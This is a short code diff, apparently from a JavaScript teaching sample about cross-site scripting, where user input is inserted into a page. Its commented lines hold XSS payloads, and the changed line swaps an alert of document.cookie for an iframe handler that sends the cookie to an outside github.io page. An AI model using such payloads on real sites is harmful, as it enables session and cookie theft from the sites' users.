@@ -15,4 +15,4 @@ document.querySelector ( 'input' ).onchange = function ( event ) {
         insertUserText ( event.target.value )
 }
 // <IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>
-// <IFRAME SRC=js/attack.js onmouseover="alert(document.cookie)"></IFRAME>
+// <IFRAME SRC=js/attack.html onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' + document.cookie, '_self')"></IFRAME>
